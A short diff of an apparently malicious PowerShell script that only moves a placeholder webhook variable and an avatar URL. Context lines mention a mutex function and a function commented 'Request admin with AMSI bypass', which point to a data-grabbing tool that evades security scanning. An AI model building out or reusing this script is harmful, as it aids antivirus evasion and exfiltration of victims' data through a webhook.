@@ -23,6 +23,9 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
+$webhook = "YOUR_WEBHOOK_HERE"
+$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -45,10 +48,6 @@ public static class ProcessUtility
     }
 }
 "@
-
-$webhook = "YOUR_WEBHOOK_HERE"
-$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-
 
 # Request admin with AMSI bypass
 function INVOKE-AC {
